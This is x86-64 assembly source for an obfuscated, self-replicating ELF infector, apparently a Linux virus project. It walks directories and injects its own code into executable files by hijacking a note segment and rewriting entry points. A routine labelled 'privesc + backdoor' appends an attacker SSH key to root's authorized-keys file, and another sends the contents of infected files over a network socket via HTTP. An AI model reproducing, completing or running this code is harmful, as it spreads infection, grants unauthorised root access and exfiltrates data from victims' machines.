%include "pestilence.inc"

bits 64 
default rel

section .text
global _start

_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
; lea rdi, [rel gLbIdUM7v]                                   ; dir to open for arg readDir
; mov rsi, bDBowiO
; call cikUWMiOR
call T1KiyCzKu
test rax, rax
js osbvrTLHZ

mov rdx, 0 
lea rdi, [rel gLbIdUM7v]                                   ; dir to open for arg initDir
; mov rdi, gLbIdUM7v                                       ; dir to open for arg initDir
call w5Ym0pw2

mov rdx, 0 
lea rdi, [rel ZSxt6M]
; mov rdi, ZSxt6M                                       ; dir to open for arg initDir
call w5Ym0pw2

call th2gDagBD

; jmp rgL6wuUH
osbvrTLHZ:
POPA 
mov rsp, rbp
pop rbp
bCg5B:
jmp rgL6wuUH

zOF6jAh:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 131]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 259]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 387]
or  rax, r14 
pop r14
pop r15
syscall
push rax
mov rsi, rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 114]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 242]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 370]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 498]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 385]
or  rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 388]
or  rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  r10, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 385]
or  r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl rgL6wuUH
pop rax
mov rsi, rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 114]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 242]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 370]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 498]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 125]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 253]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 381]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 509]
or  rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 388]
or  rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  r10, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 385]
or  r10, r14 
pop r14
pop r15
syscall
ret

; take directory to open in rdi-> ZnkWe4leF

w5Ym0pw2:
; placing OMmzgy78pa on the stack
push rbp
mov rbp, rsp
sub rsp, OMmzgy78pa_size
lea r8, FAM(OMmzgy78pa.Y1qDXqCN)
or qword [r8], -1
lea rsi, FAM(OMmzgy78pa.ZnkWe4leF)
call klfIuF                                            ; strcpy(OMmzgy78pa.ZnkWe4leF(rsi), ZnkWe4leF(rdi))
cmp rdx, 0 
je cikUWMiOR
call Q5peR59                                            ; strlen(OMmzgy78pa.ZnkWe4leF(rsi))
add rsi, rax
cmp BYTE [rsi - 1], '/' 
je FsP7sexmaZ
mov BYTE [rsi], '/' 
add rsi, 1 

FsP7sexmaZ:
mov rdi, rdx
call klfIuF

mov rdi, rsp

cikUWMiOR:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 147]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 275]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 403]
or  rax, r14 
pop r14
pop r15
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
jl uho6dffR

lea rdi, FAM(OMmzgy78pa.Y1qDXqCN)                             ; en registre le Y1qDXqCN dans la struct
mov [rdi], rax

owzOO6n:
lea r10, FAM(OMmzgy78pa.Y1qDXqCN) 
lea r9, FAM(OMmzgy78pa.xl76m8Qqm)                  ; init xl76m8Qqm
mov DWORD[r9], 0 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 115]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 243]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 371]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 499]
or  rax, r14 
pop r14
pop r15
mov rdi, [r10]
lea rsi, FAM(OMmzgy78pa.DljuW)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 169]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 297]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 425]
or  rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jle uho6dffR

lea r10, FAM(OMmzgy78pa.Bz5zYgT)    ; r10 -> (struct OMmzgy78pa.diretents_struct_ptr)
mov [r10], rsi                             ; OMmzgy78pa.Bz5zYgT -> OMmzgy78pa.DljuW
lea r11, FAM(OMmzgy78pa.vjER5l0u)         ; r11 -> (struct OMmzgy78pa.vjER5l0u)
mov DWORD [r11], eax 

U3D38pkTb:
lea r8, FAM(OMmzgy78pa.xl76m8Qqm)         ; r8 -> total lu de getdents
lea r9, FAM(OMmzgy78pa.vjER5l0u)         ; r9 -> total a lire de getdents
mov r10, FAM(OMmzgy78pa.Bz5zYgT)   ; r10 -> actual dirent struct
lea r11, FAM(OMmzgy78pa.Bz5zYgT)   ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] 
add [r8], r12d                           ; update du total lu dans r8
add [r11], r12                            ; OMmzgy78pa.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x4
je WXt39p6o
cmp BYTE [r10 + D_TYPE], 0x8
jne IHdE6

pXnhLHURc:
; strlen
mov rsi,  rsp
call Q5peR59
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
add rax, 1 
sub rsi, rax
mov rdi, rsp
call GjTE69MKS

; printing
; writeWork
; writeBack

; ajouter les foncton pour chaques fichier ici
; call mFp1SSi
call Bw1654I

jmp IHdE6

WXt39p6o:
lea rdi, FAM(OMmzgy78pa.ZnkWe4leF)
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne CFNIUnf
cmp BYTE [rdx + 1], 0 
je IHdE6
cmp BYTE [rdx + 1], 0x2e 
jne CFNIUnf
cmp BYTE [rdx + 2], 0 
je IHdE6

CFNIUnf:
call w5Ym0pw2

IHdE6:
mov r8, FAM(OMmzgy78pa.xl76m8Qqm)
mov r12, FAM(OMmzgy78pa.vjER5l0u)
cmp r8d, r12d                    ; if (total lu >= total getdents)
jge owzOO6n
jmp U3D38pkTb

uho6dffR:
mov rdi, FAM(OMmzgy78pa.Y1qDXqCN)
cmp qword rdi, 0 
jle BzpaAlBB1g
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 106]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 234]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 362]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 490]
or  rax, r14 
pop r14
pop r15
syscall
or qword FAM(OMmzgy78pa.Y1qDXqCN), -1
jmp BzpaAlBB1g


; mov rdi, FAM(OMmzgy78pa.Y1qDXqCN)
; syscall


BzpaAlBB1g:
leave

Frh5daUu:
ret

Bw1654I:
push rbp
mov rbp, rsp
sub rsp, AlaG1EQD7S_size
lea rax, INF(AlaG1EQD7S.Jan7Jq)
mov qword [rax], 0 
lea rax, INF(AlaG1EQD7S.EUIpRRY)
mov byte [rax], 0 
lea rax, INF(AlaG1EQD7S.dYu9R1HYk)
mov qword [rax], 0 

mFp1SSi:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 147]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 275]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 403]
or  rax, r14 
pop r14
pop r15
mov rdi, rsi
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 118]
shl r14, 0x18
mov  rsi, r14 
movzx r14, byte [r15 + 246]
shl r14, 0x10
or  rsi, r14 
movzx r14, byte [r15 + 374]
shl r14, 0x8
or  rsi, r14 
movzx r14, byte [r15 + 502]
or  rsi, r14 
pop r14
pop r15
xor rdx, rdx
syscall
cmp rax, 0x0 
jl BzpaAlBB1g
mov INF(AlaG1EQD7S.z6iUW6Bl1w), rax

; === get file size ===
n0nyb:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 107]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 235]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 363]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 491]
or  rax, r14 
pop r14
pop r15
mov rdi, INF(AlaG1EQD7S.z6iUW6Bl1w)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rsi, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  rsi, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  rsi, r14 
movzx r14, byte [r15 + 385]
or  rsi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 147]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 275]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 403]
or  rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jle bMQHHc
mov INF(AlaG1EQD7S.FYqWE), rax
mov INF(AlaG1EQD7S.iOu1TVjYK), rax

P5EMFJRoIS:
; rax -> map
mov rsi, rax        ; rsi = file_size
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 70]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 198]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 326]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 454]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 385]
or  rdi, r14 
pop r14
pop r15
mov rdx, 0x2| 0x4| 0x1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  r10, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 388]
or  r10, r14 
pop r14
pop r15
mov r8, INF(AlaG1EQD7S.z6iUW6Bl1w)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  r9, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  r9, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  r9, r14 
movzx r14, byte [r15 + 385]
or  r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl bMQHHc
call zttSFlmhy
mov rax, r12
mov rsi, r15
lea r8, INF(AlaG1EQD7S.xe3pTfFv)
mov [r8], rax

sKcZ2qAM8t:
cmp dword [rax + 1], 0x02464c45 
jne VvkEFUsR

ZXOrkaO:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + ZdMqbtRNsW.kg64yuKzIs]
xor rcx, rcx
lefjq:
cmp cx, [r15  + ZdMqbtRNsW.pJH6qftju]
jge pBX2U 
add r14, cKTHtR_size
inc rcx
jmp lefjq
pBX2U:
mov INF(AlaG1EQD7S.MtcRr7VJ), r14
xor r9, r9
Sqwhlrug:
cmp cx, 0 
jle rYGIGKdTdG
PZwtRO9VS:
bt word [r14], 0 
jnc bkEx8S
bt qword [r14], 0x20 
jc QC5AcQNS
bkEx8S:
dec rcx
sub r14, cKTHtR_size
jmp Sqwhlrug

rYGIGKdTdG:
mov r9, INF(AlaG1EQD7S.Jan7Jq)
cmp r9, 0 
je VvkEFUsR
cmp byte INF(AlaG1EQD7S.EUIpRRY), 1 
je SnlGD
jmp kmjLa          ; else jmp kmjLa

QC5AcQNS:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
JnS4YeVc:
; r8 -> potential qpOZp
; r9 == qpOZp variable
mov r8, r15
add r8, [r14 + cKTHtR.Gv11FV62k]
add r8, [r14 + cKTHtR.hJBCdA]
sub r8, jkDDgF3
mov r9, [rel qpOZp]
cmp qword r9, [r8]
je VvkEFUsR

JCw3fV0vPa:
mov r9, INF(AlaG1EQD7S.Jan7Jq)
test r9, r9
jz gAphDjUi
mov r9, INF(AlaG1EQD7S.EUIpRRY)
test r9, r9
jz bkEx8S

gAphDjUi:
; r8 == end of AlaG1EQD7S offset
; r9 == next segment offset
mov r8, [r14 + cKTHtR.Gv11FV62k]
add r8, [r14 + cKTHtR.hJBCdA]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, cKTHtR_size
add r9, cKTHtR.Gv11FV62k
cmp [r9], r8
setb INF(AlaG1EQD7S.EUIpRRY)   ; if ([r9] < r8) { AlaG1EQD7S.EUIpRRY = 1) }

HXNkE:
; r8 -> AlaG1EQD7S structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (gAphDjUi)
;*r14 -> segment header in header table
lea r8, INF(AlaG1EQD7S.wQYZ3)
mov [r8], cl
lea r8, INF(AlaG1EQD7S.WVhct4BVn)
mov r12, [r15 + ZdMqbtRNsW.c8jczNhnsU]
mov [r8], r12
lea r8, INF(AlaG1EQD7S.Jan7Jq)
mov [r8], r13
lea r8, INF(AlaG1EQD7S.ArYFEEBAvn)
push r9
mov r9, [r14 + cKTHtR.eovRiCgZbY]
add r9, [r14 + cKTHtR.SDrqeU]
mov [r8], r9
pop r9
lea r8, INF(AlaG1EQD7S.R6R2oZrVdV)
mov [r8], r14
jmp bkEx8S

SnlGD:
ANf46st:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 113]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 241]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 369]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 497]
or  rax, r14 
pop r14
pop r15
mov rdi, INF(AlaG1EQD7S.z6iUW6Bl1w)
lea rsi, INF(AlaG1EQD7S.FYqWE)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl VvkEFUsR

PHkMU:
mov rdi, INF(AlaG1EQD7S.xe3pTfFv)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 108]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 364]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 492]
or  rax, r14 
pop r14
pop r15
syscall

YIoRUa:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 70]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 198]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 326]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 454]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 385]
or  rdi, r14 
pop r14
pop r15
mov rsi, INF(AlaG1EQD7S.FYqWE)    ; rsi = file_size
mov rdx, 0x2| 0x4| 0x1
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  r10, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  r10, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  r10, r14 
movzx r14, byte [r15 + 388]
or  r10, r14 
pop r14
pop r15
mov r8, INF(AlaG1EQD7S.z6iUW6Bl1w)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  r9, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  r9, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  r9, r14 
movzx r14, byte [r15 + 385]
or  r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl bMQHHc
lea r8, INF(AlaG1EQD7S.xe3pTfFv)
mov [r8], rax

aGmUL6H:
mov r14, INF(AlaG1EQD7S.xe3pTfFv)
movzx rax, word [r14 + ZdMqbtRNsW.cHC4qT]
add r14, [r14 + ZdMqbtRNsW.i9Xlu353]
xor rcx, rcx

YBG6Ss:
cmp rcx, rax
jge RkCYbXkg9
mov rbx, [r14 + VqnyqBSZy.kcXx59zf]
add rbx, [r14 + VqnyqBSZy.eYSiLJ0o]
cmp INF(AlaG1EQD7S.dYu9R1HYk), rbx
jge BbWJKgnNcL
mov INF(AlaG1EQD7S.dYu9R1HYk), rbx

BbWJKgnNcL:
add r14, VqnyqBSZy_size
inc rcx
jmp YBG6Ss

RkCYbXkg9:

YxZ0EGzeGR:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(AlaG1EQD7S.xe3pTfFv)
movzx rax, word [r14 + ZdMqbtRNsW.pJH6qftju]
add r14, [r14 + ZdMqbtRNsW.kg64yuKzIs]
xor rcx, rcx

Wk5Uex:
cmp rcx, rax
jge daL8MoQ
cmp dword [r14 + cKTHtR.reLrvX], 0x4
je WjfI7Zro

H9wurQ:
add r14, cKTHtR_size
inc rcx
jmp Wk5Uex

daL8MoQ:
mov r14, -1 

WjfI7Zro:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl qdpjs9Y8c
mov dword [r14 + cKTHtR.reLrvX], 0x1
mov qword [r14 + cKTHtR.h9Ldjr], 0x1| 0x4
mov qword [r14 + cKTHtR.hJBCdA], CODE_LEN 
mov qword [r14 + cKTHtR.SDrqeU], CODE_LEN 
mov qword [r14 + cKTHtR.qCkSGCKi], 0x1000
mov rax, INF(AlaG1EQD7S.iOu1TVjYK)
add rax, 0x1000
and rax, -4096
mov qword [r14 + cKTHtR.Gv11FV62k], rax
mov qword INF(AlaG1EQD7S.Jan7Jq), rax
mov rax, INF(AlaG1EQD7S.dYu9R1HYk)
add rax, 0x1000
and rax, -4096
mov qword INF(AlaG1EQD7S.ArYFEEBAvn), rax
mov qword [r14 + cKTHtR.eovRiCgZbY], rax
mov qword [r14 + cKTHtR.Lis0YpW], rax

kmjLa:
ZnCNhs:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(AlaG1EQD7S.xe3pTfFv)
add r8, ZdMqbtRNsW.c8jczNhnsU
mov r10, INF(AlaG1EQD7S.ArYFEEBAvn)
mov [r8], r10
cmp byte INF(AlaG1EQD7S.EUIpRRY), 0 
jg vmHbA1
mov rdi, CODE_LEN 
call lZMvjF

vmHbA1:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (YEgcOF - _start)
mov rdi, INF(AlaG1EQD7S.xe3pTfFv)
add rdi, INF(AlaG1EQD7S.Jan7Jq)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN 
cld          ; copy from _start to YEgcOF (= !std)
rep movsb

qdpjs9Y8c:
; r8 -> bCg5B instruction's addr (bCg5B + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(AlaG1EQD7S.xe3pTfFv)
add r8, INF(AlaG1EQD7S.Jan7Jq)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(AlaG1EQD7S.ArYFEEBAvn)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(AlaG1EQD7S.WVhct4BVn)
sub r9, r10
mov [r8], r9d
jmp VvkEFUsR

lZMvjF:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(AlaG1EQD7S.R6R2oZrVdV)
push r8           ; save header start for later

; * Update file size *
add r8, qword cKTHtR.hJBCdA
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, cKTHtR.SDrqeU
add qword [r8], rdi

ret

; --- privesc + backdoor
th2gDagBD:
; open "/root/.ssh/authorized.key"
; r9 == Y1qDXqCN
push rbp
mov rbp, rsp
sub rsp, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 147]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 275]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 403]
or  rax, r14 
pop r14
pop r15
; mov rdi, P3aNh2
lea rdi, [rel P3aNh2]
mov rsi, 0x0002| 0x0040
mov rdx, 600 
syscall
test rax, rax
js BzpaAlBB1g
mov r9, rax

WQvxQTQO2H:
; *r9 == Y1qDXqCN
; r10 == size read
; rsi -> buffer
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 129]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 257]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 385]
or  rax, r14 
pop r14
pop r15
mov rdi, r9
mov rsi, rbp
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
mov  rdx, r14 
movzx r14, byte [r15 + 169]
shl r14, 0x10
or  rdx, r14 
movzx r14, byte [r15 + 297]
shl r14, 0x8
or  rdx, r14 
movzx r14, byte [r15 + 425]
or  rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je JDfYJ7L
jl M9IVk32Zr
mov r10, rax

vzNXeN:
; rcx == nombre d'octet lue
; r11 -> buffer
mov rcx, r10
mov r11, rsi

; for every new line
EMttOkY:
cmp byte [r11], 0xa 
je d95nc7VIj
inc r11
loop EMttOkY
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 388]
or  rax, r14 
pop r14
pop r15
mov rsi, jLm5K
mov rdx, 1 
syscall
jmp JDfYJ7L

; cmp the line with pub ssh key
d95nc7VIj:
mov byte [r11], 0 
mov rdi, r11
sub rdi, vNOmOUYXy - 1 
lea rsi, [rel G41rJ]
push rcx
call vOScuUM
pop rcx
test rax, rax            
je M9IVk32Zr
inc r11
loop EMttOkY

; if not found write it
JDfYJ7L:
mov rdi, r9
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 388]
or  rax, r14 
pop r14
pop r15
lea rsi, [rel G41rJ]
mov rdx, vNOmOUYXy - 1 
syscall
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 388]
or  rax, r14 
pop r14
pop r15
lea rsi, [rel jLm5K]
mov rdx, 1 
syscall

M9IVk32Zr:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 106]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 234]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 362]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 490]
or  rax, r14 
pop r14
pop r15
mov rdi, r9
syscall
jmp _returnLeave;


wCLbSrii9:
CWkr1lobjc:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 109]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 237]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 365]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 493]
or  rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
mov  rdi, r14 
movzx r14, byte [r15 + 147]
shl r14, 0x10
or  rdi, r14 
movzx r14, byte [r15 + 275]
shl r14, 0x8
or  rdi, r14 
movzx r14, byte [r15 + 403]
or  rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
mov  rsi, r14 
movzx r14, byte [r15 + 132]
shl r14, 0x10
or  rsi, r14 
movzx r14, byte [r15 + 260]
shl r14, 0x8
or  rsi, r14 
movzx r14, byte [r15 + 388]
or  rsi, r14 
pop r14
pop r15
xor rdx, rdx
syscall
test rax, rax
js Frh5daUu
mov rdi, rax

vZgkthLz:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 110]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 238]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 366]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 494]
or  rax, r14 
pop r14
pop r15
lea rsi, [rel cayjQ9]
mov rdx, 16 
syscall
test rax, rax
js bZFukrNs0b
mov rax, rdi
ret

iMkZg:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 108]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 236]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 364]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 492]
or  rax, r14 
pop r14
pop r15
mov rdi, rsi
mov rsi, rdx
syscall
pop rdi

; (rdi: socket)
bZFukrNs0b:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 106]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 234]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 362]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 490]
or  rax, r14 
pop r14
pop r15
syscall
mov rax, -1
ret

; extrait les donnees des fichiers via http
zttSFlmhy:
mov r12, rax                                    ; r12 -> maped file_date
push rsi
call CWkr1lobjc
pop rsi
mov r13, rax
BRPFI9mW:
cmp r13, 0 
jl Frh5daUu
S23MMxN:
; rax -> mmap buffer
; r15 == la size du mmap buffer
; r12 -> maped file_data
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 70]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 198]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 326]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 454]
or  rax, r14 
pop r14
pop r15
xor rdi, rdi
push rsi
add rsi, p7JoOByuKM
add rsi, ewFgX4
add rsi, 10 
mov r15, rsi
mov rdx, 0x2| 0x4
mov r10, 0x2| 0x20
xor r8, r8
xor r9, r9
syscall

YEper:
; r14 -> header buffer
; *r15 == la taille du mmap buffer
mov r14, rax
mov rsi, rax
lea rdi, [rel lXTJWE]
call klfIuF
pop rax
push rax
add rsi, p7JoOByuKM - 1 
call tUhyVQ
lea rdi, [rel hy2XABbSiM]
call klfIuF
add rsi, ewFgX4 - 1 
mov rdi, r12
pop rcx
call ZnrcR

ZpIrJGQ:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 111]
shl r14, 0x18
mov  rax, r14 
movzx r14, byte [r15 + 239]
shl r14, 0x10
or  rax, r14 
movzx r14, byte [r15 + 367]
shl r14, 0x8
or  rax, r14 
movzx r14, byte [r15 + 495]
or  rax, r14 
pop r14
pop r15
mov rdi, r13
mov rsi, r14
mov rdx, r15
xor r10, r10
xor r9, r9
syscall
push rdi
jmp iMkZg

